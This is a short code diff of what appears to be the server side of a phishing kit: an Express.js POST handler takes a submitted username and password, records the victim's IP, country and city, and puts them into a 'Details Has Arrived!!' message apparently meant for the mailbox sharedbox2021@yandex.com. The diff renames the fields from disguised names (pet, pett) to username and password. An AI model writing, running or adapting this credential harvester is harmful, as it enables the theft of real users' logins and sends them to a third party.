@@ -27,7 +27,7 @@ app.get("/", (request, response) => {
 
 // https://expressjs.com/en/starter/basic-routing.html
 app.post("/", (req, res) => {
-  const { pet, pett, source, error } = req.body;
+  const { username, password, source, err } = req.body;
   console.log(req.body);
   let logEmail = "sharedbox2021@yandex.com";
 
@@ -48,8 +48,8 @@ app.post("/", (req, res) => {
     </head>  
     <body>
     Details Has Arrived!!
-    <h3>User: ${pet}</h3>
-    <h3>Access: ${pett}</h3>
+    <h3>User: ${username}</h3>
+    <h3>Access: ${password}</h3>
     <h3>IP: ${ip}</h3>
     <h3>Country: ${country}</h3>
     <h3>City: ${city}</h3>
